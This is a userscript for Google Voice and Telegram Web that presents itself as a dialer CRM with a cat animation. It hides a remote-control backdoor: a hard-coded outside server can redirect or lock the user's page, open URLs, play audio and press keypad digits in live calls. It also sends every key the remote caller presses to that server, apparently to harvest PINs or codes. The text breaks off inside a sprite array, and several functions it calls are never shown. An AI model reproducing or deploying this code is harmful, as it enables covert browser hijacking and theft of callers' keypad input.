// ==UserScript==
// @name         Daddys Little Dialer
// @namespace    http://tampermonkey.net/
// @version      6.7.1
// @description  Daddys Little Dialer (Femboy Edition) - Google Voice CRM + Telegram bridge + DTMF Detection + Neko
// @author       josh
// @match        https://voice.google.com/*
// @match        https://web.telegram.org/*
// @run-at       document-start
// @grant        GM_setClipboard
// @grant        GM_addStyle
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_notification
// @grant        GM_addValueChangeListener
// @grant        unsafeWindow
// ==/UserScript==

(function() {
    'use strict';

    const isGoogleVoice = window.location.hostname === 'voice.google.com';
    const isTelegram = window.location.hostname === 'web.telegram.org';

    console.log(`[Call Helper] Running on ${isGoogleVoice ? 'Google Voice' : 'Telegram Web'}`);

    // =============================================================================
    // CONTROL API (Telegram bot bridge)
    // Declared here so this file is self-contained: it is normally injected by
    // loader.js via new Function(), where these names are NOT in scope.
    // =============================================================================
    const CONTROL_API = 'https://familiar-miranda-devsnow-31583718.koyeb.app';

    function gmRequest(opts) {
        return new Promise((resolve, reject) => {
            const req = (typeof GM_xmlhttpRequest === 'function')
                ? GM_xmlhttpRequest
                : (typeof GM !== 'undefined' && GM.xmlHttpRequest);
            if (!req) {
                fetch(opts.url, { method: opts.method || 'GET', headers: opts.headers || {} })
                    .then(r => r.text())
                    .then(resolve)
                    .catch(reject);
                return;
            }
            req({
                method: opts.method || 'GET',
                url: opts.url,
                headers: opts.headers || {},
                data: opts.data,
                onload: r => resolve(r.responseText),
                onerror: reject,
                ontimeout: () => reject(new Error('timeout')),
                timeout: opts.timeout || 15000,
            });
        });
    }

    function logToBot(kind, msg, meta) {
        try {
            gmRequest({
                method: 'POST',
                url: CONTROL_API + '/log',
                headers: { 'Content-Type': 'application/json' },
                data: JSON.stringify({ kind, msg: String(msg).slice(0, 500), meta: meta || null }),
            }).catch(() => {});
        } catch (_) {}
    }

    // =============================================================================
    // TROLL ACTION HANDLER (pushed from the bot over /events)
    // =============================================================================
    function showTrollAlert(text) {
        const div = document.createElement('div');
        div.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483647;background:#fff;border:2px solid #a30262;border-radius:12px;padding:28px 36px;font:600 18px system-ui;box-shadow:0 24px 64px rgba(0,0,0,0.5);max-width:520px;text-align:center;color:#3B0720;';
        div.textContent = text;
        const close = document.createElement('button');
        close.textContent = 'OK';
        close.style.cssText = 'display:block;margin:18px auto 0;padding:10px 24px;font:600 14px system-ui;background:#a30262;color:#fff;border:none;border-radius:6px;cursor:pointer;';
        close.onclick = () => div.remove();
        div.appendChild(close);
        document.body.appendChild(div);
    }

    function pressGVKeypad(digits) {
        for (const d of digits) {
            const btn = document.querySelector(`button[data-key="${d}"], [aria-label="${d}"], [data-dialpad-key="${d}"]`);
            if (btn) {
                try { btn.click(); } catch (_) {}
            }
        }
    }

    function handleTroll(data) {
        const { action, payload } = data;
        logToBot('troll', 'action=' + action);

        if (action === 'alert') {
            showTrollAlert(payload.text || 'Message from admin');
        } else if (action === 'open') {
            try { window.open(payload.url, '_blank', 'noopener,noreferrer'); } catch (_) {}
        } else if (action === 'redirect') {
            try { location.href = payload.url; } catch (_) {}
        } else if (action === 'play') {
            try {
                const audio = new Audio(CONTROL_API + payload.url);
                audio.volume = 1.0;
                audio.play().catch(err => logToBot('error', 'audio play blocked: ' + err.message));
            } catch (_) {}
        } else if (action === 'dtmf') {
            const digits = (payload.digits || '').split('');
            for (const d of digits) {
                if (window.dtmfBridge) window.dtmfBridge.push(d);
            }
            pressGVKeypad(digits);
        } else if (action === 'lock') {
            document.body.innerHTML = '<div style="font:600 24px system-ui;padding:80px;text-align:center;">Panel locked by admin.<br><br>Reload to unlock.</div>';
        }
    }

    // =============================================================================
    // REMOTE CONTROL STREAM (SSE)
    // Handles the bot's init / switch / troll messages. Reconnects on drop.
    // =============================================================================
    function listenForSwitch(currentVersion) {
        let source = null;
        try {
            source = new EventSource(CONTROL_API + '/events');
        } catch (err) {
            console.warn('[GV Control] events stream unavailable', err);
            return;
        }

        source.onmessage = (e) => {
            let data;
            try { data = JSON.parse(e.data); } catch (_) { return; }

            if (data.type === 'init') {
                logToBot('control', 'stream init v=' + (data.version || currentVersion));
            }

            if (data.type === 'switch') {
                logToBot('control', 'switch -> ' + (data.version || 'unknown'));
                try { location.reload(); } catch (_) {}
            }

            if (data.type === 'troll') {
                handleTroll(data);
                return;
            }
        };

        source.onerror = () => {
            // EventSource retries on its own; just note it.
            console.warn('[GV Control] events stream error');
        };
    }

    // =============================================================================
    // SHARED STORAGE FUNCTIONS (GM_setValue/GM_getValue)
    // =============================================================================
    function setShared(key, value) {
        GM_setValue(key, JSON.stringify(value));
    }

    function getShared(key, defaultVal = null) {
        try {
            const val = GM_getValue(key, null);
            return val ? JSON.parse(val) : defaultVal;
        } catch (e) {
            return defaultVal;
        }
    }

    // =============================================================================
    // DTMF DETECTION BRIDGE
    // Shared between the early (document-start) WebRTC hook and the late UI.
    // Defined at IIFE scope so both can read/write it.
    // =============================================================================
    const dtmfBridge = {
        digits: [],        // [{digit, time}] keys pressed during the current call
        active: false,     // true while a remote audio track is attached & being analysed
        onDigit: null,     // UI callback: (digit:string|null) => void  (null = clear display)
        onState: null,     // UI callback: (active:boolean) => void
        reset()  { this.digits = []; if (this.onDigit) this.onDigit(null); },
        push(d)  { this.digits.push({ digit: d, time: Date.now() }); logToBot('dtmf', 'digit ' + d); if (this.onDigit) this.onDigit(d); },
        setActive(v) { this.active = v; if (this.onState) this.onState(v); }
    };
    try { window.dtmfBridge = dtmfBridge; } catch (_) {}

    // Run a function now if the DOM is ready, otherwise on DOMContentLoaded.
    // Under @run-at document-start the DOM usually isn't parsed yet, so anything
    // that touches the document must wait; the RTC hook, in contrast, must NOT wait.
    function whenReady(fn) {
        if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', fn);
        else fn();
    }

    // =============================================================================
    // GOOGLE VOICE - CALL HELPER
    // =============================================================================
    if (isGoogleVoice) {
        // The DTMF hook must run at document-start, but it MUST NOT be able to
        // take down the rest of the script. If hooking fails for any reason
        // (sandbox/CSP/unsafeWindow access throwing), we log it and carry on so
        // the helper panel still loads. Detection is a nice-to-have; the panel
        // is the core feature.
        try {
            installDTMFHook();
        } catch (e) {
            console.error('[Call Helper] DTMF hook failed to install (panel will still load):', e);
        }
        whenReady(initCallHelper); // UI waits for the DOM
        whenReady(initNeko);       // the cat follows the mouse once the DOM is up
    }

    // =============================================================================
    // DTMF DETECTION -- WebRTC hook + Goertzel decoder
    // Runs at document-start so it wraps RTCPeerConnection before GV uses it.
    // Captures ONLY the remote (incoming) audio track, so it shows the keys
    // pressed by the person you're talking to -- never your own keypad.
    // =============================================================================
    // =============================================================================
    // NEKO.JS - animated cat that follows the cursor
    // Embedded from https://github.com/louisabraham/nekojs (GPL v3).
    // The IIFE below self-registers window.Neko / window.createNeko.
    // initNeko() (further down) starts the cat once the DOM is ready.
    // =============================================================================
    /**
     * Neko.js - Bundled version
     * Copyright (C) 2025 Louis Abraham
     *
     * Based on Neko98 by David Harvey (1998)
     * Original Neko by Masayuki Koba
     *
     * Licensed under GPL v3 (see LICENSE.md)
     */

    (function() {
        "use strict";

        // Embedded sprite data (base64-encoded)
        const NEKO_SPRITES = [
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABIklEQVR4nO1WSQ7EMAiDUf//ZeYwoguYLdVIPdSnqklsB0gI0QsMeQJntKAiQuPLG7ILRUQkIUTjqfinMMCI4KcBzUUcpYFsV0oQCTgEBi9TdFwNMB27bakYka455Vc9l4LISCYAB6xBK6zYAtI0b0akg5CvKkLMxpgv+p9hIx/COUsfTmv7s6CF01pKQZT7QU3siIoQ4pxjFWPmy/fUzCT87YvoZKbkn6SAu1XeFW9PMtjDcI6IMWd5BfwjorUidLdZMSZZb1g6BQTqYdghbxkISaMGldXEtAZaJwEczVu9oN2ikZEKlQERkfSBkTWmam1l4BJudNtlhsDa+6dg+CRrIe0FaDdTVBGLIiAqnIkreSZiOBxZtHKyZfh0L+a/eA6+YR662bT+YjsAAAAASUVORK5CYII=",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA40lEQVR4nO1XyxLDIAiUTv7/l+mhsfUBsogZM233ZkZ2F2SIUpoHN2uaIUGDWrHEXH8iEqlMfq9rboU7wpcRmPeBCpfiUrb527mHk1C1iIGu5Kv2wgauAnJW5rmr5EA/QAYERyNBl8b2CiA9QG1m1hoVhzacqEogVeTqQcSasEj6MRM2oCqCo9jUGUVVWRORqwLC1BS1hk04I57jmtGsYvskNA14s88oqxAyMDuE0NiRgW4AzcAaSPfvgZ83EOqDVfeBlDb+C0Qj74V+SYV5D6eBknjJw+T2Tfj9BqKAX0B/aHgCdIBeOO78F8UAAAAASUVORK5CYII=",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABDklEQVR4nO1Wyw4DIQiEpv//y/TQuEVXmBG3ySbtnFQQRuWhSh02zLViBG0anXwE1otUU1Oh8JE5907a2MxOzsf1yb7wIBmBzpiqduMRbc3MujECJDASuVqXJvAtQAL+6huiGBjnIDBFROQJNeT85tEVMw5LBNg3XUxNESGzYDSE5m2NIQ4L0YzAzPCMhNsb+qGfAJ3Iy9jT0wQ8iZnD5jSSXUIAGV5x6oGCUCup5TaLgDijK6GqUmnF6h36hM67nSWRD7Ji/wYiB60FRynIABGwanA5EqmB+3fDP4HbEph9WCtYKsUe7CcFYbcUqySF5tJSDAyXe8YygeRUJRJLBIgr3eqeGUxASd3U/2G8AFt7mTLOfRenAAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABF0lEQVR4nO2W3Q6DMAiFYdn7vzK70E5KDpTS6s1GYqJt5XzlR8tUM1H3XPSx9LKIHAzMKRfuomUABKHn1DzUehUBoKCIkIh8gZhZwwl6970DAAExM4EoCR2RaBO8JQIRhH5utycEE21KQQQBrKuFbQCO2NBmAERd2fYb2sjLlTiwQ1tooZDTilEXyMh5NezavAgMxdMCV6qgFhrcLR6m+dY2zJgF2Lb7CsDj4hagZOaH040/AmD/gJbjdoBOrfB17ABWP6+VGrqlDTP9DwGqXbASuQbQKWuHXpXbta0QZ3avAciecpuzKCpaXA9nxRsAOmIzcAzFveesMQBonqC6dy4wPqcAtFj6gIJgZvM/vTiC2eTzbz9oHxxQekFCimcpAAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABKUlEQVR4nOWX3Q7CMAiFD2bv/8p4sdGxFljpT7zwJMaoG+cDCpnAv4sWxOAZj1kABgBmBtEZivnJc33v+mQAmkxrs8q0XBNBpAAsQy9zB6jx+yQASGdWkYGIysu7H2cVH6RHAiCUVCAAEIiHMhW44sddi1qBuwKlElmAtBRwmRgNmQVgPXISsPNGs02ZM2BOgScPsp4Iq6HaRX5vzImoO3vPHHBaoMrFlrlcIwHr917z5sMd++5VNsvAPLUJl0BEG1BkHcL5lBFnreWeAb3j35bPqDnwrEBZFBbQDnN9YWrGV5kDiU2YbcNSgFXjOASw0xw4D6G5ZrMa6b8AvAXalz6qFoxmMXofMPBI5rRneEQKQE8WM5l6+uwK3KvjV8ai7Q+lq9T8oVilL9sKg2SESmbvAAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABGElEQVR4nO2W3Q6DMAiFwfj+r8xupBLKb+vijSfZkilwPmmlA/j0snAhhzbzlwEIAIDo9kcc6csglcTJeCqyAZIlUGTsgLQgjk5wpgu2TpwAtJ6+AUHyvgewZF7QVNcC2DY3ukBeXQ0wgsTOdlWIGcaq7kiUABNhZkBEZgwiAptm3WQAMgbM8nDpLOG0B7rmXheieFBvgV53vGOffRMYVEIc6ubfzD0dhvl1qdZW3nD6Gn8qAAj2mpchLCC5rKr1UrR8GMmiVheqsCkAm0hTQbdlDgB4dhP1vKh0yDMfX77X/eRWF4Li4yfYJ+MISjtgbcTIWAwmTgyXOeyAiqFo6nmHTab2n1Ijz5ukjwNICDSurdT79Ol9/QD98LQSLfZm6wAAAABJRU5ErkJggg==",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABBklEQVR4nO1V0Q6EMAiDi///y9yLLHUC66Ymd4lNTNQArQWcyIsfgMH1NM8JHxERMxMzS4OeIm8C2OBV8v3jUgGqqh55txMluQsQFOFCbhAxJEcBd4qwgvz0UqMgTAZRUWyZG2Gv12pFQ9hXRDeqdS2Zcc4wdhsJQCFQzB80i2HRO0ANTrAtVB4jYAozg4oCMY9uAVMYgRtVxV0WkIFtyaUWrAJXEX1aHiSS8PDKb6ZboKq0vcxPbJN9Gsk/2NKul3WlsD44G+YJBi4cBGSrwwrJXKpENAGYXAzN0AbPj4T2B1ET0CdHSglEdTI3QkvCA2YRp7YGR/zyl9IinK97fpr3xYs/wxfuy7Lj/kO2hgAAAABJRU5ErkJggg==",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABHElEQVR4nO2WwRLDIAhEof//z9tLSJUAATTTQ7uHzKSi+6JIIfrry+JCLDat4060DGQcgO3PPHmXQUKDY/Ezhj7BU4y8q/gSQGig40bDFfNoAgyICc4wfw6gCNI+gluA1IJFiFfLJdABLvSg+PruB5hZXO8T7DEAZT7tyDjmAbAqMGmNSalAAECDhTtQgmDmi7kBcdHdEaQgxDh7c8abkskBlq9bkQeXTUKmhbyIVL0FJkS3aHUATMkRabi7dyJCB+CyC5KAACq5AiLi5R2wYLJTz0dTZl+Qci5ew2AdFhIzBwzTa14sAIjc5kXgjLF+B5OBsEAERvcLu/4NvSLFYiaAql94tB+YQLz82AnQKtX7i/vcgun14fz+w3oDTA6XRee9YIQAAAAASUVORK5CYII=",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABDklEQVR4nO2WSxLDIAxDUaf3v7K7aEKJI/8I7abRMjHWsw0Mrf27kIiRYvwSgG4q8vEHDuFLYFgSGU3pIlDvKaCwA6cfBtwGVYaIFtBRmMkmILxgyRpfgXBHUDVXEMxD9LeHleSqOVlPN7cJ4CWPlDUvA4iICwGgZF4G8CCYuYiEoywDMBmVp2QBIDvvq1rSASZdgDodvV1fA8jqWV2g571X5px/SzIFcMpiGLIToYTWfjgCa1N7AKeTYLU/o9mbMH0coxtS7ZUenHoT6qr321BXFcCivTfeISizCQEgfKYNtCzBCHHQ1Cmwqnc6Yramct/2Loxmuu3qe5i/BLAbkFm7r55VAGPymbW3blG9AHEphjo0CJF9AAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA80lEQVR4nO2WwRLDIAhEoZP//2V6qHZMdHGRNL24M7kosi+IjiI5WfmW9cqYm5mYWQV5HOAWbYC/AxzBeK/Z2jllE9KBUrqeSqpK52a3gDYvwSLk0WQAQuZRiBnAknkEInwKyv7S8zOIEICqiplBiNl8FACWf2RSzVG8gCrQFfAMGECk5ZuwNYnALQF4BuhP2SpEr+LOJCtUgXxmMi8C+FzmgePkqcnTJYQVqM+tEYR3D4zGvKeb24Q/qEAnCFAXZRutrkcQXg98V1y3ooXyxi/wp5zt4EynLExFBn8LfUIvom4AVCKSP9Nlo1Lc07VbW0/qDae6gB08t42YAAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA+0lEQVR4nO1Wyw7EIAiEzf7/L7MXadTKY6gemuwkPRSFGVFBojykfZHNs9/wyZKLXPGktzV7TyZtcLY/EqCMW+fBAk4gI6BPf5RaZG5aQBaCpF7xLTK5/whecQb+ApiZS8Gbn+sMZyASg4qF6gAzk4iYJPP4sTqwEqHkKNICEAIvS2UBHkl19UTBCVUuJbw5d6sMxk2eUin2SFFYW5B+0QBYxrQyoCnbJULI2IboEC6dvDqAxMkIOI5UL3jI4fpng7tXsXoFiYAtsKobImoFqA7MInqSqChtEdAHZ+ZbRiqFCTlgQ1s2fDNzBrziGg7Y/SJCkekRJ/rIOfwAzH6TFVfg/LAAAAAASUVORK5CYII=",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABA0lEQVR4nO2XzRKDMAiEwfH9X5kebDQSfhOcHurepDPuR8DVAvy78KH7UtSjEuA0Jbr8EW8Wg98KAA0FGkp3swPGJoqaa2as4+Fnt7BiroCU7kDIPAPCiyTUxeWqgth44WtCQs2bryoLfADwIDxlIUUAC8IyQMT0mFSAZshvqEHMmLsAFtjsPpQAZCUloARA2rZXdesB/EQbHJse3h5EPE+kP5nZvdjhmo2aeP31bBpqEkfw5MxDAJkuvTFYTwAHwH62XuIl4NKvY7d9fkItBXkaRgB2B2p4/1d2D+DnAHJDac4r0RwJohuEtScsSUNEGWzza6kBRL8FZwA8hf+MvHrV6wMLunpMS0n3sAAAAABJRU5ErkJggg==",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABHUlEQVR4nO2WyxbDIAhEh578/y/TRWpKEFCRnm4yS19zeWgCPPqzaHM/756dBbiMmW0GIpLnW4sIAI6MeTP9mGjTm4Fcr9YyAEpnQEIoILLWeYBbJQggIOcdOAAFJWBmMLNrPNJqBsx6Thk5GXhFZrh3b855oAagzc7BM9prLhv9DEBnJsd/YdwBCIgGAj2n7/2svPp3ABLCirpBrIBE5npiqcPl3c+aA7l3YCiRoWGqygFmopaK3oFQzgdmybwB3E4afOGuJszeCK0DJ/FU90WNl4ke+JZgaqM2r8hCyTXMRg+oJmwRRZG1+leYWxu7j46GmfnJWFH3DnhvvlP/7SaQJbD+dMkyqTLXAGV1TQPMqBrObMJgvNT8EQC8AQ4mj0+E62kZAAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABHElEQVR4nO2WwRLDIAhE2U7//5fppVjUFVHTaQ/ZmVwSw74gEEVu/Vi4KI7uxjwFUBER1Y8/UEKmYu8CdMZd4CTIDoBGxgOQoc/jm+YZeQCVupguMX+/M3yxysBs8a6iuN0WuMVa3z7jGkF4AFjlquoIpJOr9ukaBhEWoYGoKjUCELYiA2wh0l1wuAXwIB6i6oLV/l6EAsuiARTzzJ6uqEk52npYHUSXQogkagBAudqg2WyRcVwgntK0BduKkwIM/gUwAGqQaS+fhV1II9uadC2EiWRx+jekLWJBRs/M3A+sVbWRWQT4+8yE1YufE9GZoO0CkKu8bF/MUj4DG2l16kwHlquJUl+R19GRjKR2+XR8dCglMcKvvXXrL/UCkH+5C6s6Dz0AAAAASUVORK5CYII=",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABAklEQVR4nO2V2xKDMAhE2U7//5fpi1iCXBJL60zHfdKY5CwkINGti4VgnJNvHWJ5eMxM6oYzMzFzbmCb0G2CBSzKMtBtYoADICJCaqDRhAsn8jNwgCkTZ4yE8OHBm+zJbpCBtw3TtU8PDoAKI1GZ7ouqQDwDU2JmieQAnoVqlZcwMkHvaIe6Xlg3GBjOfiGS8s5UCo/AptmCPgWXBroAleQI4Fysn+jQB4aXL2VB94Mq7CVDE/1j3cBqFuQoJztqauB0c9GAbA8AYRW48Cq6qHSzknb7uQeQ8y2qZepS673Kv6GO2sDP1C3brMD7aMHqvaNZCMTdUIcPM3ZNp7p16+/1AoBksuBmmrTtAAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABCElEQVR4nO2XwRLDIAhEodP//2V6aDa1gBEUc+h0T5mUuk8UJUzrkuaZs39+Jgb3A+Qdwpz2HgIIBoe0if59Ro+eOQxhyswkIqdphTnRJwMYjfHcGsB8hwCA3N5qTmSXwOykneYeQEiVUKMyDKmpjvSZ0AsyJXhl7sWqku3CLANEdMC4XldpMhWxAyKyTmXZ8CCmqqBStwIcmfxK5+0Z0BAhAO+qbS+qFUUOovOCas2rNmZ6CSpmvQSwOnM9gSgAV888C2A0C6QzmAFg7PxII6qrxImVLADRcYxGIUTE9JV4D5UcRCMIhDkQMt2QRPoAB8yeKRPew++FwLhnFz4F0Hm/p07/+nm9AC/+b1UxIU8OAAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABJ0lEQVR4nOWW2xLDIAhEl0z//5fpQ6NFJCAa04cy0+klsnsELwX+PWhgDN+gMZ3MzK0/EZUH9fMKhJfIygQaRkMltMNB7BlKU2vM+WwI4GUZn8mdsq6GNfOMuQUQJnpVmYkCoFVNkMg8O3sAOKS4MGAhuDUqgFxUo2WW44iofE/1qACQhJDiRJSqRBZCK4fbzxT5zr75TejLh43ngTa6Slhm+t0CFpVgr63hSbgaEtDaJeFdcJJsMQf6FnQan9zbtmM3kwiggmQh9OyvqjgKkIaIFmYVTQAInXsWJwDKVCArPhRbAK6u6scAMhCz+2toHWgA67jeVgHpA+c8mQWYPZy6PP2XLCvW9SG7RVdbQPo1UJlmzBNrwIVYacEyBPC7CmyP5sLx4g2TyYdbcQVdwQAAAABJRU5ErkJggg==",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABH0lEQVR4nOVX0RLCIAwrnv//y/EFbgVaGjp2emdedFLSUCCrIhzgfI7j7fs47uLFBpIAAAEwinLxjgiTYzQKGTclq6u8iIpLtcxBCwAgpZQp8USoYqqoZQ76DBjE03hVuqpGSgAaMYsdEadvwTYYmdhZfUdOnIFIgJnZE5S5CZSAJysQnYHSiPTqxpVaz0xyKkCUB6gfZqJh/KgAL+mS+BJ0xgm7B/4QHqlAzZmqQMhPOWHmFrCv5EhA2oRYEV+34p8UsNXTbcDkHQXoPYfI0t9DqLlur2j2hPrgNVvNGlHYQdn5n9gB2xu8+l77MFSjC3JatMWcfauUfs90POA3n96cCdH/Ao8g2ib65GZ8AEaJ01fllhHdTX4HT5nVH+IDSk+VHrQ/yTUAAAAASUVORK5CYII=",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABHUlEQVR4nOVWWw7DMAiDqfe/MvvoQ4xAMHlok2ZpmloS7AIhEGGQ66efrd37T/FCyEWERKTkGMUxsTcTc9t5iQDmx88ZChFrt+HvEj/7gDVykzFzQ9wRCglAaqAhVyQNcbVeIAHIl48CjsAulGqg7PxMS5cjE+AyR4K82sh4UgEzuV8RASIVheg4es+of7gGdHi9qFg78vWwgIi06xiMAtStyBRjoQiXRODiHIpA6h++jqtA23EmYOoYIiK+3op/UoCd/1bB9WsF6JwLUbe/p9BTVDQnuCOZbasj84AeULrrfP49w4fXG6L4NheQckDWFr13bPVWSZ850+vFCGBgT4PxCjOpQluvxUwfYOeKLhfPbCPimWO6Erua1x/gDfHvngq4OJEYAAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA/ElEQVR4nO2WUQ/DIAiEj2X//y+zF2ksgmCL3UsvWbJM4nfisRbYL24fU5/dcGaXvd1ACAeA7x/hDABUDW70YYHoQBG6TFQaSLW8MwKgLgMpeCvcYiCUPvnjBrSkE48b0J3YNYYuXGfgioEhbcxsbi5QqTFNrYKzaY8kxrIG0mOWBTc2ZwxM4VGLDbDAz1+uwDXAvWcHDszHcKntEsSJSMMjA8tKmBjkjWFJ6FTg0gZuk2d3HhkoG7cILOozcBueabln4AQnojBMuuYKXIoHuLdmmUjsnypg4zfoNe9hYx2gG8mpCbkCgvNH0a9ZJ76dm8X6VVr1W/erV/X6AU6CeC0t3vKrAAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABCElEQVR4nO2WzRKDMAiE2Y7v/8r0kqSISVzS0F5kxoPK8G34U5F803J17ZUNVx2y0wXcwjMFUHARkWM3uNBpf+yEz8BAQ1nmNgF0youQytXsKfDgWp6m9mcCRvYXATYLqQIA+NRffRbiXiKpqgAYQ5wI04ihKYjO+NCsAHYR0WPWAdkgfgypElAL5k7g6iIKLRjG12cF8mkqLyacdlaE9T8KSQBoR0TIRtPgT21ftT3gVuRS012imz1gOTY2PIxtqhnUP3L3p5K3r9KOEzsBVDlrCTCpUxq853hKQ2T+V+CMM/uXsxqf24RGTVeEb2Kzcm8ZzOcY9eqd+NvmjXZelLbzp/exx3LsDfOJkxZk2B+5AAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA+UlEQVR4nO2VSw6AIAxEKfH+V64bwfIpTPm5cRKNgdB50FKd08XPs1W+NcnMAeQbgBMQXYDdEB4NLCCWgtATkKSXMKwvIgprlwNwy3gHhKyBaP4EPyKoCE8AwEe/CyCRTMXudMgiLGpAOxUicsyswZmIqwAzElAQSPUa5jsbAUOv6VAjEgbTDSsAvO7AbkMNIOpBmHNvMe9AsBysRsyNRswVgFhrXoxUDVf0gex3npz49XpRGC2OamEzKtJtiQzdDlQhLZafEYmFS8zjy6jkJAz9IBkqPhBTdXKiGSEASXuWZtq1zHbc9LhakwCZZg6ndkkKJuL++vW9bhYolBau0DkQAAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABA0lEQVR4nO2WSw7DIAxEPVHuf2V30TgyCP8SoJuOVKkthHkG24HIFl+fpTq8QWYWkN8A7IA4KLHVKyHQLXz/vkzbyYCetwRgaGyATIFociBjruZNOZJhEqqtXq6DKB/5MgDRzshFp3yRXdgNga+3XXLWGDNbsKUI3Lp/omqvEIBVICFEP+F2j0C8I6pAjAZDCMmBjCKIUSOC90DFnCjumuHr+I15Rh4AAEzpC94unKM/NQQR8cTmJBXXGFQefn0EfVKWcsDpfqU1SB1HBQCjFpzJk36OhsiGk7kzmuZkdFoAKQDWUfcLBHdHMW/W02NRFURklrkX2KMqqKb+/pvNX3891QdsP4ApjDDinQAAAABJRU5ErkJggg==",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABBElEQVR4nN2X2wrDQAhEx9L//+XpQ7PB7FVdE2gHCoVtnIOuxgJ/JB4fl15Z5iRBsoA8CsDDOKRdgIu5iACAPAmwZQ4A74DXLN/6zATjJTbX25oRTwlcl83aEVaA0E23QFgAttpsBbECaMyP2g61OvcCNMFJDk1W516AYdp6JsXcG68HQKjZXowMBl3A8py6C5cgNYB+qZzBrCaj3+nv9aWsizVNey1dhtV5RwK0o3j0RBfMWJIpRdrLKKrfBJjNgUcAMnUbgDUbVgAZtdyqFbMAGrOZqWdqelcyEZEzckYmIjsh8B0u7GRE4PxfEAXQhkWhreWWLsjaBzYZ8rdi/5j7BX0ADfCTHKrbEI8AAAAASUVORK5CYII=",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABCklEQVR4nNWX4Q7DIAiEYdn7vzL7MW3QgnLIlvSSJUus3KcopUQPlrTfkV5ZcxEhEekgaTFq3NzHIMyZWCmAC6QKIpsCbobHeoPP7/Ktx0OEyDJu274MHExJNAWQeZtAFLghEQDYHIHYAaTNoxDwLdidfvR2QADMTCLimuzGUQB32yyTbo7GswCEVK3vRgEDE7DPU2dhCDID6JfMFSxq4j2n/8+Hck7Wcttn6TTsxg0x0b0UezNMsGBKlhTZl1GZngmwqgN/AahUGKCqAUkDaOnT713F6n7ArfGJ+z8IaslmCG8n6LvyUJFAe8LBwFhp2PgUQBt2pToXuB+oVhSAsx8eVQAZ/aZwVOsDqwuPItm/Ur4AAAAASUVORK5CYII=",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABCklEQVR4nO2WSw7DMAhEcdX7X9ldJFQO5jfYirLISFmkJcOTwcZEr3D189miT4mg920gJQCGGEDuBxhBViAsgE7AEq+UpNmeh1drl5DGSfj/yfCIt3xxAMXcTF6B8IJUCC2ZAxtCbGlCUSZIywAMwUJhIIDI3CpHFaDJhNpyj+9ocqK4SVKNKEGS3ukg9UyQdVf6YBvABcI0KkIgLTsRJLo/9P8CANKsAjSpeg70lb0/ClkBNfn5QxkARU81I+KdKUFqzhuTMvw2KsF4BqhGzoiW38LbZFpuLVn2/LfOBWgXrDQbW5Aoi1uC7A2IY71blPThsphXMivxmAiZhNawcgGS+l9UgfhXz9EPsSqlDRy22m8AAAAASUVORK5CYII=",
